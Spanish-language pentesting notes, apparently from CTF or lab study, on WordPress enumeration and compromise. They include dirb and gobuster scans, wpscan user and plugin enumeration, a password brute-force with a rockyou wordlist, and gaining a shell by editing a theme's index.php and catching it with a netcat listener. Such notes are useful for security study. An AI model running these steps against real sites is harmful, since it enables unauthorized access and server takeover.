- Tags : #enumeration #enumeration_wordpress #wordpress #tools #cms

```bash
#Dirb realiza busquedas recursivas
dirb http://172.0.0.2

#Cuando este archivo esta habilitado pues nos permite realizar ataques de Fuerz Bruta
/wordpress/xmlrpc.php

```

**Enumeración de usuarios, xmlrpc, enumeración de usuarios y fuerza bruta en wordpress**
```bash
wpscan --url 'http://dir/wordpress' -e u  #Enumerar usuarios 

#Fuerza bruta partiendo de encontrar un user
wpscan --url 'http://dir/wordpress' -U mario -P rockyu.txt  #Enumerar usuarios 

```

**Acceso al servidor desde panel interno de wordpress**
Buscar plugins o algo que nos permita editar archivos internos del wordpress , o podemos instalar plungins de manera manual

![](../../../attachments/Pasted%20image%2020260204122902.png)

Luego buscariamos la direccion para ejecutar el fichero modificado *twentytwentytwo/index.php* que es un thema.
```bash
dirb http://ip/wordpress/

#Detectando la direccion de la carpea themas ahi ponemos el nombre del fichero
http://ip/wordpress/themes/twentytwentytwo/index.php 

#Estando a  la escucha en nuestro kali pues tendriamos una conexion
nc -nlv 4444

```

**Proceso de enumeración de plugins de wordpress, tanto con wpscan como sin ello**

```bash
wpscan --url 'http://dir/wordpress' -e u,vp --api-token='token' #Enumerar plugins vulnerables

wpscan --url 'http://dir/wordpress' -e u,vp --api-token='token' --plugins-detection agressive -t 50  #Escan agresivo 

-e, --enumerate [OPTS]      Enumeration Process
                             Available Choices:
                             vp   Vulnerable plugins
                             ap   All plugins
                             p    Popular plugins
                             vt   Vulnerable themes
                             at   All themes
                             t    Popular themes
                             tt   Timthumbs
                             cb   Config backups
                             dbe  Db exports 
                             u    User IDs range. e.g: u1-5
                                  Range separator to use: '-'                                                        Value if no argument supplied: 1-10
                             m    Media IDs range. e.g m1-15
                 Incompatible choices (only one of each group/s can be used):
                 - vp, ap, p
                 - vt, at, t
```

Tambien podemos hacer fuzzin para detectar los plugins en un wordpress, nos descargamos una wordlist de plugins y lo utilizamos con gobuster
```bash
gobuster dir -u 'http://dir/wp-content/plugins/' -w wordlist_plugins.txt

#Cada pluggin cuenta con  un readme.txt
http://dir/wp-content/plugins/canto/readme.txt
```